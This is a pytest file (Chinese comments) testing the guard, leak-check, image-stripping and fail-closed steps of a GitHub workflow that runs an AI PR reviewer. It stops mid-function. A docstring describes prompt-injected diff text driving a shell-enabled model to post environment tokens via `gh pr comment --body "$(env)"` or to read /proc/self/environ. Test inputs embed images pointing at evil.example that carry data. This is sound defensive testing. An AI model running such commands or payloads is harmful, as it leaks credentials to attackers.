"""_reusable-pr-review.yml 裡兩段把關 shell 的行為測試。

為什麼要測：這兩段決定了「敏感內容會不會被送去 LLM」與「PR 會不會被放行」，
出錯的代價分別是個資外流與閘門失效，但它們內嵌在 YAML 的 run: block 裡，
沒有測試就沒人會發現改壞了。

為什麼是「從 YAML 抽出來跑」而不是把腳本複製一份到 tests/：
reusable workflow 的 actions/checkout 取的是**呼叫端** repo，本 repo 的
scripts/ 不會出現在執行環境裡，所以邏輯必須內嵌在 YAML。既然不能抽成檔案，
測試就直接讀 YAML 執行，這樣邏輯與測試永遠不可能漂移。
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest
import yaml  # 宣告在 requirements.txt；缺了要讓 CI 紅，不要靜默 skip

WORKFLOW = (
    Path(__file__).resolve().parents[1]
    / ".github"
    / "workflows"
    / "_reusable-pr-review.yml"
)

GUARD_STEP = "敏感路徑檢查"
PRECHECK_STEP = "決定是否執行 AI review"
VERDICT_STEP = "貼出 review 並套用閘門判定"

GUARD_104 = "\n".join([r"^fixtures/.*\.json$", "^reports/", r"\.db$", r"\.sqlite3?$"])
GUARD_ARENA = "\n".join(["^workspaces/", "^reports/", r"^data/arena\.db"])


def _step_script(step_name: str) -> str:
    doc = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    for step in doc["jobs"]["review"]["steps"]:
        if step.get("name") == step_name:
            return step["run"]
    raise AssertionError(f"workflow 裡找不到名為 {step_name!r} 的 step")


def _fake_gh(tmp_path: Path, changed_files: str = "") -> Path:
    """假的 gh：回傳指定的檔案清單，其餘子指令記錄呼叫後成功返回。

    記錄檔讓測試能斷言「有沒有加 label」這種副作用。
    """
    bindir = tmp_path / "bin"
    bindir.mkdir()
    (bindir / "gh").write_text(
        textwrap.dedent(
            f"""\
            #!/usr/bin/env bash
            echo "$@" >> "{tmp_path.as_posix()}/gh-calls.log"
            if [ "$1" = "pr" ] && [ "$2" = "diff" ]; then
              cat <<'CHANGED'
{changed_files}
CHANGED
              exit 0
            fi
            if [ "$1" = "pr" ] && [ "$2" = "view" ]; then
              [ -f "{tmp_path.as_posix()}/gh-view-fail" ] && {{ echo "HTTP 502" >&2; exit 1; }}
              [ -f "{tmp_path.as_posix()}/gh-view.txt" ] && cat "{tmp_path.as_posix()}/gh-view.txt"
              exit 0
            fi
            exit 0
            """
        ),
        encoding="utf-8",
    )
    (bindir / "gh").chmod(0o755)
    # 有些 step 會呼叫 python3；Windows 的 Git Bash 不一定找得到，指向跑測試的這個直譯器
    (bindir / "python3").write_text(
        f'#!/usr/bin/env bash\nexec "{_msys(Path(sys.executable))}" "$@"\n',
        encoding="utf-8", newline="\n",
    )
    (bindir / "python3").chmod(0o755)
    return bindir


def _msys(p: Path) -> str:
    """C:\\Users\\x → /c/Users/x（Git Bash 的 PATH 認得的形式）。"""
    s = p.as_posix()
    if os.name == "nt" and len(s) > 1 and s[1] == ":":
        return f"/{s[0].lower()}{s[2:]}"
    return s


def _bash() -> str:
    """在 Windows 上明確挑 Git Bash。

    裸 `bash` 在裝了 WSL 的 Windows 會解析到 WSL 的 bash，它看到的是 /mnt/... 檔案系統，
    測試用的假 gh 不在它的 PATH 上，於是真的 gh 被呼叫、噴 git 錯誤——症狀完全不像
    「PATH 挑錯直譯器」，很容易往邏輯錯誤的方向查。
    """
    if os.name == "nt":
        for candidate in (
            r"C:\Program Files\Git\bin\bash.exe",
            r"C:\Program Files (x86)\Git\bin\bash.exe",
        ):
            if Path(candidate).exists():
                return candidate
        pytest.skip("Windows 上找不到 Git Bash；這些測試在 CI（ubuntu）會跑")
    found = shutil.which("bash")
    if not found:
        pytest.skip("環境裡沒有 bash")
    return found


def _run(script: str, cwd: Path, bindir: Path, env: dict[str, str]):
    # 寫成檔案再執行，不要用 bash -c "<多行腳本>"：在 Windows 上 argv 會走 MSVC
    # 的引號規則，單引號與反斜線會被吃掉（printf '%s\n' 變成 printf %sn），
    # 腳本以完全不同的語意執行。
    script_file = cwd / "_step.sh"
    script_file.write_text(script, encoding="utf-8", newline="\n")

    # PATH 在 bash 裡是用 `:` 分隔的，而 Windows 的 PATH 每一項都含磁碟機冒號
    # （C:\Windows;...）。把兩者串起來會被切成一堆碎片，假 gh 進不了搜尋路徑，
    # 真的 gh 被呼叫，錯誤訊息看起來完全像是腳本邏輯壞掉。
    # Windows 上改成只給 MSYS 形式的 bindir + Git Bash 自己的 /usr/bin。
    if os.name == "nt":
        path = f"{_msys(bindir)}:/usr/bin:/bin"
    else:
        path = f"{bindir}{os.pathsep}{os.environ['PATH']}"

    full_env = {
        **os.environ,
        "PR": "1",
        "PATH": path,
        **env,
    }
    return subprocess.run(
        [_bash(), str(script_file)],
        cwd=cwd,
        env=full_env,
        capture_output=True,
        # 不指定就會用系統 locale（Windows 上是 cp950），中文輸出直接 UnicodeDecodeError。
        encoding="utf-8",
        errors="replace",
    )


def _calls(tmp_path: Path) -> str:
    log = tmp_path / "gh-calls.log"
    return log.read_text(encoding="utf-8") if log.exists() else ""


# ---------------------------------------------------------------- guard


@pytest.mark.parametrize(
    "changed, guard, blocked, why",
    [
        ("parser.py\napp.py\nfixtures/README.md", GUARD_104, False, "一般改動放行"),
        ("parser.py\nfixtures/sample_detail.json", GUARD_104, True, "真實履歷 fixture"),
        ("talents.sqlite3", GUARD_104, True, "sqlite 資料庫"),
        ("notes.db", GUARD_104, True, "db 副檔名"),
        ("reports/a.md\nfixtures/x.json\nb.db", GUARD_104, True, "多條 pattern 同時命中"),
        ("src/arena/cli.py\nworkspaces/c01/main.py", GUARD_ARENA, True, "考生工作區"),
        ("src/arena/cli.py", GUARD_ARENA, False, "arena 一般改動放行"),
        # guard_paths 是 YAML block scalar，尾端與中間都可能夾空行
        ("parser.py", "^reports/\n\n^workspaces/\n", False, "guard_paths 含空行不誤判"),
    ],
)
def test_guard_blocks_only_sensitive_paths(tmp_path, changed, guard, blocked, why):
    bindir = _fake_gh(tmp_path, changed)
    res = _run(
        _step_script(GUARD_STEP),
        tmp_path,
        bindir,
        {"GUARD_PATHS": guard, "GUARD_REASON": "測試用原因"},
    )
    assert (res.returncode != 0) is blocked, f"{why}: {res.returncode=} {res.stderr=}"
    if blocked:
        # 擋下時必須貼上 needs-work，否則閘門判定那步會誤放行
        assert "pr edit 1 --add-label needs-work" in _calls(tmp_path), why
        body = (tmp_path / "guard-comment.md").read_text(encoding="utf-8")
        assert "不該進版控" in body and "git rm --cached" in body, why


def test_guard_comment_lists_every_hit(tmp_path):
    bindir = _fake_gh(tmp_path, "reports/a.md\nfixtures/x.json\nkeep.py")
    _run(
        _step_script(GUARD_STEP),
        tmp_path,
        bindir,
        {"GUARD_PATHS": GUARD_104, "GUARD_REASON": "r"},
    )
    body = (tmp_path / "guard-comment.md").read_text(encoding="utf-8")
    assert "reports/a.md" in body and "fixtures/x.json" in body
    assert "keep.py" not in body, "沒命中的檔案不該出現在擋下留言裡"


# ------------------------------------------------------------- precheck


def _precheck(tmp_path: Path, author: str, author_type: str, token: str) -> dict[str, str]:
    """跑 precheck step，回傳它寫進 $GITHUB_OUTPUT 的 key/value。"""
    out = tmp_path / "gh-output.txt"
    out.write_text("", encoding="utf-8")
    res = _run(
        _step_script(PRECHECK_STEP),
        tmp_path,
        _fake_gh(tmp_path),
        {
            "GITHUB_OUTPUT": out.as_posix(),
            "PR_AUTHOR": author,
            "PR_AUTHOR_TYPE": author_type,
            "TOKEN": token,
        },
    )
    assert res.returncode == 0, f"precheck 不該非零離開: {res.stderr}"
    parsed = dict(
        line.split("=", 1) for line in out.read_text(encoding="utf-8").splitlines() if line
    )
    return {**parsed, "_stdout": res.stdout}


@pytest.mark.parametrize(
    "author, author_type, skip, why",
    [
        ("gsinvest017-ai", "User", False, "人類的 PR 照常 review"),
        ("github-actions[bot]", "Bot", False, "auto-fix loop 自己開的 PR 最需要被審"),
        ("dependabot[bot]", "Bot", True, "dependabot：allowed_bots 沒放行，會紅燈"),
        ("renovate[bot]", "Bot", True, "白名單而非黑名單——沒列名的 bot 預設跳過"),
    ],
)
def test_precheck_only_reviews_humans_and_github_actions(
    tmp_path, author, author_type, skip, why
):
    """機器人的 PR 必須在呼叫 action 之前就跳過。

    沒擋掉的話 claude-code-action 會以「Workflow initiated by non-human actor」
    exit 1，變成一個 PR 作者無從處理的紅燈——實例見 PR #18 / run 30699145258。
    """
    assert _precheck(tmp_path, author, author_type, "tok")["skip"] == str(skip).lower(), why


def test_precheck_skips_cleanly_without_token(tmp_path):
    """缺 secret 要乾淨跳過，不是讓整個 job 紅掉。"""
    result = _precheck(tmp_path, "gsinvest017-ai", "User", "")
    assert result["skip"] == "true"
    assert "CLAUDE_CODE_OAUTH_TOKEN" in result["_stdout"], "要留下告訴 repo 主人怎麼補的訊息"


def test_precheck_allowlist_matches_action_allowed_bots():
    """precheck 放行的 bot 必須也在 action 的 allowed_bots 裡，否則照樣紅燈。

    這兩份名單分屬不同檔案區塊，很容易只改一邊。
    """
    doc = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    script = _step_script(PRECHECK_STEP)
    for step in doc["jobs"]["review"]["steps"]:
        if step.get("uses", "").startswith("anthropics/claude-code-action"):
            allowed = step["with"]["allowed_bots"]
            assert "github-actions" in allowed
            assert "github-actions[bot]" in script, "precheck 放行的 bot 與 allowed_bots 不一致"
            return
    raise AssertionError("找不到 claude-code-action step")


# -------------------------------------------------------------- verdict


@pytest.mark.parametrize(
    "verdict_line, expect_label",
    [
        ("NEEDS_WORK: no", False),
        ("NEEDS_WORK: yes", True),
        ("NEEDS_WORK:   yes  ", True),
        ("", True),  # 沒有判定行 → fail closed
        ("NEEDS_WORK: maybe", True),  # 無法辨識 → fail closed
    ],
)
def test_verdict_fails_closed(tmp_path, verdict_line, expect_label):
    bindir = _fake_gh(tmp_path)
    (tmp_path / "review-output.md").write_text(
        f"## 這個 PR 做了什麼\n改了一行\n{verdict_line}\n", encoding="utf-8"
    )
    res = _run(_step_script(VERDICT_STEP), tmp_path, bindir, {})
    assert res.returncode == 0, res.stderr
    added = "pr edit 1 --add-label needs-work" in _calls(tmp_path)
    assert added is expect_label, f"{verdict_line!r} -> {added=}"


def test_verdict_line_stripped_from_comment(tmp_path):
    bindir = _fake_gh(tmp_path)
    (tmp_path / "review-output.md").write_text(
        "## 結論\n可以合 ✅\nNEEDS_WORK: no\n", encoding="utf-8"
    )
    _run(_step_script(VERDICT_STEP), tmp_path, bindir, {})
    comment = (tmp_path / "comment.md").read_text(encoding="utf-8")
    assert "NEEDS_WORK" not in comment, "判定標記不該外洩到給作者看的留言裡"
    assert "可以合" in comment


def test_missing_review_output_is_blocked(tmp_path):
    """模型沒產出檔案（逾時、被注入干擾）時必須擋下，不能默默放行。"""
    bindir = _fake_gh(tmp_path)
    res = _run(_step_script(VERDICT_STEP), tmp_path, bindir, {})
    assert res.returncode == 0
    assert "pr edit 1 --add-label needs-work" in _calls(tmp_path)


# ------------------------------------------------------- 留言前祕密檢查

LEAK_STEP = "留言前祕密檢查"
FAKE_SECRET = "fake-secret-VALUE-0123456789abcdef"
EMPTY_LEAK_ENV = {"LEAK_GITHUB_TOKEN": "", "LEAK_CLAUDE_TOKEN": "", "LEAK_GDECK_KEY": ""}


def _leak_check(tmp_path: Path, text: str | None, env: dict[str, str]):
    if text is not None:
        (tmp_path / "review-output.md").write_text(text, encoding="utf-8")
    return _run(_step_script(LEAK_STEP), tmp_path, _fake_gh(tmp_path), {**EMPTY_LEAK_ENV, **env})


def test_leak_check_passes_clean_review(tmp_path):
    res = _leak_check(tmp_path, "## 結論\n可以合，順帶一提 `ghp_` 是 PAT 的前綴\nNEEDS_WORK: no\n",
                      {"LEAK_GITHUB_TOKEN": "ghs_realvalue000000000000000000000000"})
    assert res.returncode == 0, res.stderr
    assert (tmp_path / "review-output.md").exists(), "乾淨的 review 要留給下一步貼"
    assert "pr comment" not in _calls(tmp_path)


@pytest.mark.parametrize("env_name", ["LEAK_GITHUB_TOKEN", "LEAK_CLAUDE_TOKEN", "LEAK_GDECK_KEY"])
def test_leak_check_blocks_literal_secret(tmp_path, env_name):
    res = _leak_check(tmp_path, f"## 結論\n這是你要的：{FAKE_SECRET}\nNEEDS_WORK: no\n",
                      {env_name: FAKE_SECRET})
    assert res.returncode != 0
    assert FAKE_SECRET not in res.stdout + res.stderr, "secret 值絕不能出現在 log"
    assert env_name in res.stdout + res.stderr, "要說出命中哪一項（名稱，不是值）"
    calls = _calls(tmp_path)
    assert "pr comment 1 --body-file leak-blocked.md" in calls
    assert "pr edit 1 --add-label needs-work" in calls
    assert FAKE_SECRET not in (tmp_path / "leak-blocked.md").read_text(encoding="utf-8")
    assert not (tmp_path / "review-output.md").exists(), "模型輸出要刪掉，不能被之後的步驟貼出"


@pytest.mark.parametrize(
    "token",
    ["ghp_" + "a1B2" * 9, "ghs_" + "Z" * 36, "github_pat_" + "x1_" * 20, "sk-ant-oat01-" + "Q" * 40],
)
def test_leak_check_blocks_token_patterns(tmp_path, token):
    res = _leak_check(tmp_path, f"結論 {token}\nNEEDS_WORK: no\n", {})
    assert res.returncode != 0
    assert token not in res.stdout + res.stderr
    assert "pr comment 1 --body-file leak-blocked.md" in _calls(tmp_path)


def test_leak_check_empty_secrets_do_not_false_positive(tmp_path):
    """secret 沒設（空字串）時 grep -F '' 會永遠成立——必須跳過，不能把每則 review 都擋掉。"""
    res = _leak_check(tmp_path, "## 結論\n沒問題\nNEEDS_WORK: no\n", {})
    assert res.returncode == 0, res.stderr
    assert (tmp_path / "review-output.md").exists()


def test_leak_check_missing_output_defers_to_fail_closed(tmp_path):
    res = _leak_check(tmp_path, None, {"LEAK_GITHUB_TOKEN": FAKE_SECRET})
    assert res.returncode == 0, res.stderr
    assert _calls(tmp_path) == ""


def test_leak_check_runs_before_posting():
    """順序不變式：祕密檢查必須在唯一的貼 review 步驟之前，且條件相同。"""
    doc = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    names = [s.get("name") for s in doc["jobs"]["review"]["steps"]]
    assert names.index(LEAK_STEP) < names.index(VERDICT_STEP)
    steps = {s.get("name"): s for s in doc["jobs"]["review"]["steps"]}
    assert steps[LEAK_STEP]["if"] == steps[VERDICT_STEP]["if"]
    # 只有這兩個 step 會把 review-output.md 相關內容貼成留言
    posting = [s.get("name") for s in doc["jobs"]["review"]["steps"]
               if "review-output.md" in (s.get("run") or "") and "gh pr comment" in (s.get("run") or "")]
    assert set(posting) <= {LEAK_STEP, VERDICT_STEP, FAILCLOSED_STEP}, posting


def test_leak_check_blocks_jwt_shape(tmp_path):
    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.c2lnbmF0dXJl"
    res = _leak_check(tmp_path, f"結論 {jwt}\nNEEDS_WORK: no\n", {})
    assert res.returncode != 0
    assert jwt not in res.stdout + res.stderr


# ------------------------------------------------------- 外部圖片移除

IMG_PLACEHOLDER = "[已移除外部圖片]"


def _posted_comment(tmp_path: Path, body: str) -> str:
    (tmp_path / "review-output.md").write_text(body + "\nNEEDS_WORK: no\n", encoding="utf-8")
    res = _run(_step_script(VERDICT_STEP), tmp_path, _fake_gh(tmp_path), {})
    assert res.returncode == 0, res.stderr
    assert "pr comment 1 --body-file comment.md" in _calls(tmp_path)
    return (tmp_path / "comment.md").read_text(encoding="utf-8")


import re as _re

_UNESCAPED_IMG = _re.compile(r"(?<!\\)!\[")
_HTML_IMG = _re.compile(r"<(img|image|source|video|picture|audio|svg)\b", _re.I)


def _assert_no_image(out: str):
    """沒有任何東西能被 GitHub 渲染成圖片：沒有未跳脫的 `![`、沒有圖片類 HTML 標籤。"""
    assert not _UNESCAPED_IMG.search(out), out
    assert not _HTML_IMG.search(out), out


def _same(body: str, out: str):
    assert out in (body, body + "\n"), f"程式碼必須一字不改:\n{body!r}\n→\n{out!r}"


def test_remote_images_are_neutralized(tmp_path):
    body = (
        "看這張 ![x](https://evil.example/?d=AAAA) 圖\n"
        '<img src="https://evil.example/x">\n'
        '<IMG\n  src="https://evil.example/multiline">\n'
        "![ref][r]\n\n[r]: https://evil.example/ref\n"
        "<picture><source srcset=\"https://evil.example/s\"></picture>\n"
        "一般連結 [link](https://example.com) 要保留\n"
    )
    out = _posted_comment(tmp_path, body)
    assert out.count(IMG_PLACEHOLDER) >= 5, out
    _assert_no_image(out)
    for bad in ("](https://evil.example/?d=AAAA)", 'src="https://evil.example/x"'):
        assert bad not in out, out
    assert "[link](https://example.com)" in out, "一般連結不會被自動抓取，必須保留"


def test_clean_comment_unchanged(tmp_path):
    body = "## 這個 PR 做了什麼\n改了 `a < b` 的判斷，見 [文件](https://example.com/doc)。\n\n- 項目一\n"
    _same(body, _posted_comment(tmp_path, body))


# --- 程式碼不能被改（fix round 2）

RUST_FENCE = "```rust\nlet v = vec![1, 2];\nlet f = vec![x][0];\n```\n"
JSX_FENCE = '```tsx\nconst A = () => <img src={logo} alt="x" />;\n```\n'


@pytest.mark.parametrize(
    "body",
    [
        RUST_FENCE,
        "~~~\nlet v = vec![1, 2];\n~~~\n",
        "````md\n```\nvec![x][0]\n```\n````\n",          # 外層較長的 fence 包住內層
        "用 `vec![1, 2]` 與 `vec![x][0]` 即可\n",
        "用 ``vec![x][0]`` 也行\n",
        JSX_FENCE,
        "JSX 寫成 `<img src={logo} alt=\"x\" />`\n",
        "前文\n\n" + RUST_FENCE + "\n後文 [link](https://example.com)\n",
    ],
)
def test_code_is_left_byte_for_byte(tmp_path, body):
    _same(body, _posted_comment(tmp_path, body))


@pytest.mark.parametrize(
    "body",
    [
        "let v = vec![1, 2];\n",
        "let f = vec![x][0];\n",
        "![x](https://evil.example/?d=A)\n",
        "![a][r]\n\n[r]: https://evil.example/r\n",
        "![r]\n\n[r]: https://evil.example/r\n",
        "![a][]\n\n[a]: https://evil.example/r\n",
        '<IMG\nsrc="https://evil.example/x">\n',
        "<image src=https://evil.example/i>\n",
        "<video poster=https://evil.example/p></video>\n",
        "<img/src=https://evil.example/x>\n",
        "!![x](y)(https://evil.example/recombine)\n",                 # 換掉後不能拼出新圖片
        "<im<img x>g src=https://evil.example/r>\n",
    ],
)
def test_images_outside_code_never_survive(tmp_path, body):
    out = _posted_comment(tmp_path, body)
    _assert_no_image(out)


@pytest.mark.parametrize(
    "body, why",
    [
        ("```\n![x](https://evil.example/a)\n", "沒關的 fence：一律當成非程式碼，剝掉"),
        ("````\n![x](https://evil.example/a)\n```\n", "關閉 fence 比開頭短 → 沒關"),
        ("`foo ![x](https://evil.example/a)\n", "沒關的行內反引號 → 不是程式碼"),
        ("`foo\n![x](https://evil.example/a) `\n", "行內程式碼不跨行"),
        ("    ![x](https://evil.example/a)\n", "4 格縮排不當程式碼"),
        ("<!--\n```\n-->\n![x](https://evil.example/a)\n```\n", "HTML 註解裡的 fence 不算"),
        ("  ```\nfoo\n```\n![x](https://evil.example/a)\n```\n", "縮排 fence 讓狀態不確定 → 全部不當程式碼"),
        ("- item\n\n  ```\nx\n  ```\nfoo\n  ```\n  ![x](https://evil.example/a)\n  ```\n", "清單內 fence"),
        ("> ```\n![x](https://evil.example/a)\n> ```\n", "blockquote 內 fence"),
        ("<div>\n`<img src=https://evil.example/a>`\n</div>\n", "HTML block 裡反引號不是程式碼"),
        ("<pre>\n\n`<img src=https://evil.example/a>`\n</pre>\n", "HTML block type 1 跨空行"),
        ('[a](x "`") ![b](https://evil.example/a) ("`")\n', "連結 title 裡的反引號"),
        ('<a title="`">![b](https://evil.example/a)<a title="`">\n', "HTML 屬性裡的反引號"),
        ('<a title="\n`"> ![b](https://evil.example/a) `\n', "跨行 HTML 屬性"),
        ("| `a | ![x](https://evil.example/a) | b` |\n|---|---|---|\n", "表格的 | 會切開行內程式碼"),
        ("\\``x` ![x](https://evil.example/a)`\n", "跳脫的反引號"),
        ("```x`y\n![x](https://evil.example/a)\n```\n", "info string 含反引號的不是 fence"),
        ("`a\nb` ![x](https://evil.example/a) `c`\n", "跨行配對會讓單行判斷錯開"),
        ("`a|b` ![x](https://evil.example/a) `c|d`\n", "不是表格時 | 在 code 裡"),
        ("$a`$ ![x](https://evil.example/a) $`b$\n", "數學 $ 可能先吃掉反引號"),
        ("| `a | ![x](https://evil.example/a) | b` |\r\n|---|---|---|\r\n", "CRLF 的表格"),
        ("<details>\n```\n-->\n![x](https://evil.example/a)\n```\n", "HTML block 裡的 fence"),
    ],
)
def test_stripper_cannot_be_tricked_into_treating_images_as_code(tmp_path, body, why):
    out = _posted_comment(tmp_path, body)
    assert "evil.example" not in out or not _UNESCAPED_IMG.search(out), why
    _assert_no_image(out)


def test_oversized_output_fails_closed(tmp_path):
    (tmp_path / "review-output.md").write_text("a" * 300_000 + "\nNEEDS_WORK: no\n", encoding="utf-8")
    res = _run(_step_script(VERDICT_STEP), tmp_path, _fake_gh(tmp_path), {})
    assert res.returncode != 0
    calls = _calls(tmp_path)
    assert "--body-file comment.md" not in calls, "超過上限不能貼模型的文字"
    assert "pr edit 1 --add-label needs-work" in calls
    assert "pr comment 1 --body-file review-failed.md" in calls
    assert FAILED_MARKER in (tmp_path / "review-failed.md").read_text(encoding="utf-8")
    assert not (tmp_path / "comment.md").exists() and not (tmp_path / "review-output.md").exists()


def test_neutralizer_crash_fails_closed(tmp_path):
    """python 那段出錯（這裡用一個會讓它崩潰的 python3 替身）時不能貼出模型文字。"""
    bindir = _fake_gh(tmp_path)
    (bindir / "python3").write_text("#!/usr/bin/env bash\nexit 1\n", encoding="utf-8", newline="\n")
    (tmp_path / "review-output.md").write_text("ok\nNEEDS_WORK: no\n", encoding="utf-8")
    res = _run(_step_script(VERDICT_STEP), tmp_path, bindir, {})
    assert res.returncode != 0
    calls = _calls(tmp_path)
    assert "--body-file comment.md" not in calls
    assert "pr edit 1 --add-label needs-work" in calls


def _neutralizer_module() -> dict:
    """把 step 裡 heredoc 的 python 原文抽出來，當成模組載入（不執行 main）。"""
    script = _step_script(VERDICT_STEP)
    m = _re.search(r"<<'PY'\n(.*?)\nPY\n", script, _re.S)
    assert m, "找不到 python heredoc"
    ns: dict = {"__name__": "neutralize_under_test"}
    exec(compile(m.group(1), "neutralize", "exec"), ns)
    return ns


def test_neutralizer_is_linear_on_pathological_input():
    import time

    ns = _neutralizer_module()
    evil = "![" * 50_000 + "<img " * 50_000 + "`" * 3 + "[" * 20_000 + "(" * 20_000
    t = time.perf_counter()
    out = ns["neutralize"](evil)
    assert time.perf_counter() - t < 2.0
    _assert_no_image(out)
    many = "`a` ![x](y) `` b `` <img z> " * 5_000
    t = time.perf_counter()
    out = ns["neutralize"](many)
    assert time.perf_counter() - t < 2.0
    _assert_no_image(out)


# ------------------------------------------------------- Claude 失敗時 fail closed

FAILCLOSED_STEP = "Claude 步驟失敗時 fail closed"
GATE_STEP = "閘門判定"
FAILED_MARKER = "<!-- gs-auto-fix:ai-review-incomplete -->"


def test_failclosed_labels_comments_and_removes_output(tmp_path):
    (tmp_path / "review-output.md").write_text("半成品\n", encoding="utf-8")
    (tmp_path / "comment.md").write_text("舊留言\n", encoding="utf-8")
    res = _run(_step_script(FAILCLOSED_STEP), tmp_path, _fake_gh(tmp_path), {})
    assert res.returncode == 0, res.stderr
    calls = _calls(tmp_path)
    assert "pr edit 1 --add-label needs-work" in calls
    assert "pr comment 1 --body-file review-failed.md" in calls
    body = (tmp_path / "review-failed.md").read_text(encoding="utf-8")
    assert "不是對程式碼的判定" in body and FAILED_MARKER in body
    assert not (tmp_path / "review-output.md").exists()
    assert not (tmp_path / "comment.md").exists()


def test_failclosed_does_not_repeat_comment(tmp_path):
    (tmp_path / "gh-view.txt").write_text(f"舊的\n{FAILED_MARKER}\nAI review 沒有完成\n", encoding="utf-8")
    res = _run(_step_script(FAILCLOSED_STEP), tmp_path, _fake_gh(tmp_path), {})
    assert res.returncode == 0, res.stderr
    calls = _calls(tmp_path)
    assert "pr edit 1 --add-label needs-work" in calls, "label 一定要加"
    assert "pr comment" not in calls, "已經有同樣的留言就不要再貼"


def test_failclosed_label_added_even_if_comment_query_fails(tmp_path):
    (tmp_path / "gh-view-fail").write_text("", encoding="utf-8")
    res = _run(_step_script(FAILCLOSED_STEP), tmp_path, _fake_gh(tmp_path), {})
    calls = _calls(tmp_path)
    assert calls.index("pr edit 1 --add-label needs-work") < calls.index("pr view"), "先加 label"
    assert "pr comment 1 --body-file review-failed.md" in calls, "查不到既有留言時寧可重貼"
    assert res.returncode == 0, res.stderr


def test_leak_check_pattern_only_wording_is_precautionary(tmp_path):
    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.c2lnbmF0dXJl"
    _leak_check(tmp_path, f"文件範例 {jwt}\nNEEDS_WORK: no\n", {})
    body = (tmp_path / "leak-blocked.md").read_text(encoding="utf-8")
    assert "範例" in body or "測試" in body
    assert "輪換" not in body, "只是樣式命中時不要叫管理者輪換 token"


def test_leak_check_literal_value_wording_says_rotate(tmp_path):
    _leak_check(tmp_path, f"值 {FAKE_SECRET}\nNEEDS_WORK: no\n", {"LEAK_CLAUDE_TOKEN": FAKE_SECRET})
    body = (tmp_path / "leak-blocked.md").read_text(encoding="utf-8")
    assert "輪換" in body


def test_failclosed_runs_only_when_claude_step_failed():
    doc = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    steps = doc["jobs"]["review"]["steps"]
    names = [s.get("name") for s in steps]
    claude = next(s for s in steps if s.get("uses", "").startswith("anthropics/claude-code-action"))
    assert claude.get("id") == "claude"
    fc = next(s for s in steps if s.get("name") == FAILCLOSED_STEP)
    assert "failure()" in fc["if"] and "steps.claude.outcome == 'failure'" in fc["if"]
    assert names.index(FAILCLOSED_STEP) < names.index(GATE_STEP)


def _gate(tmp_path: Path, gh_body: str):
    bindir = tmp_path / "bin"
    bindir.mkdir()
    (bindir / "gh").write_text("#!/usr/bin/env bash\n" + gh_body + "\n", encoding="utf-8", newline="\n")
    (bindir / "gh").chmod(0o755)
    return _run(_step_script(GATE_STEP), tmp_path, bindir, {})


@pytest.mark.parametrize(
    "gh_body, blocked, why",
    [
        ("printf 'bug\\nneeds-work\\n'", True, "有 needs-work → 紅燈"),
        ("printf 'bug\\n'", False, "沒有 needs-work → 綠燈"),
        ("echo 'HTTP 502' >&2; exit 1", True, "gh pr view 失敗不能放行"),
    ],
)
def test_gate(tmp_path, gh_body, blocked, why):
    res = _gate(tmp_path, gh_body)
    assert (res.returncode != 0) is blocked, f"{why}: {res.stdout} {res.stderr}"


# ------------------------------------------------------- 靜態安全不變式


def _claude_step() -> dict:
    doc = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    for step in doc["jobs"]["review"]["steps"]:
        if step.get("uses", "").startswith("anthropics/claude-code-action"):
            return step
    raise AssertionError("找不到 claude-code-action step")


def _flag_values(args: str, flag: str) -> list[str]:
    """抽出 claude_args 裡某個 flag 後面、到下一個 --flag 之前的所有值（與 action 的解析方式一致）。"""
    import shlex

    tokens = shlex.split(args)
    out: list[str] = []
    for i, tok in enumerate(tokens):
        if tok == flag:
            for nxt in tokens[i + 1 :]:
                if nxt.startswith("--"):
                    break
                out.append(nxt)
    return out


def test_model_has_no_shell_access():
    """模型拿到 Bash 就等於 diff 裡的注入文字可以呼叫 gh 或 `cat /proc/self/environ`。

    `Bash(gh pr comment:*)` 之類的白名單是指令前綴比對，不是參數限制：
    `gh pr comment $PR --body "$(env)"` 會通過比對，而 $( ) 在 shell 展開，
    等於把特權 context 的 token 貼成公開留言。

    而且光是「allowedTools 不列 Bash」不夠：--allowedTools 只是免詢問清單，Bash 仍可用，
    內建唯讀指令（cat 等）免詢問直接跑。所以要 --tools 限定可用工具、--disallowedTools 移除 Bash。
    """
    args = _claude_step()["with"]["claude_args"]
    allowed = _flag_values(args, "--allowedTools") + _flag_values(args, "--allowed-tools")
    assert not any("Bash" in a for a in allowed), f"不得 allow 任何 Bash: {allowed}"
    tools = ",".join(_flag_values(args, "--tools")).split(",")
    assert sorted(tools) == ["Glob", "Grep", "Read", "Write"], f"可用工具只能是讀檔＋Write: {tools}"
    denied = _flag_values(args, "--disallowedTools")
    for name in ("Bash", "Monitor", "WebFetch", "mcp__*"):
        assert name in denied, f"{name} 必須以裸名 deny（從 context 移除）"


def test_model_file_tools_are_path_scoped():
    """寫入只放行 review-output.md；.git、/proc、runner temp 一律 deny；讀寫限在工作目錄。"""
    step = _claude_step()
    args = step["with"]["claude_args"]
    allowed = _flag_values(args, "--allowedTools")
    assert allowed == ["Edit(/review-output.md)"], f"唯一的 allow 只能是寫 review-output.md: {allowed}"
    for bare in ("Write", "Read", "Edit"):
        assert bare not in allowed, f"裸的 {bare} allow 會放行工作目錄外的路徑"
    denied = _flag_values(args, "--disallowedTools")
    for rule in ("Read(/.git/**)", "Read(//proc/**)", "Read(//etc/**)",
                 "Read(/${{ runner.temp }}/**)", "Edit(/${{ runner.temp }}/**)"):
        assert rule in denied, f"缺少 deny rule {rule}"
    assert "--strict-mcp-config" in args
    assert _flag_values(args, "--setting-sources") == ["user"]
    settings = __import__("json").loads(step["with"]["settings"])["permissions"]
    assert settings["blockReadsOutsideWorkingDirectories"] is True
    assert settings["blockWritesOutsideWorkingDirectories"] is True


def test_checkout_does_not_persist_credentials():
    """GITHUB_TOKEN 不能留在模型讀得到的工作目錄 git 設定裡。"""
    doc = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    checkouts = [s for s in doc["jobs"]["review"]["steps"]
                 if s.get("uses", "").startswith("actions/checkout")]
    assert checkouts, "找不到 checkout"
    for s in checkouts:
        assert (s.get("with") or {}).get("persist-credentials") is False, s


def test_gh_token_not_at_job_level():
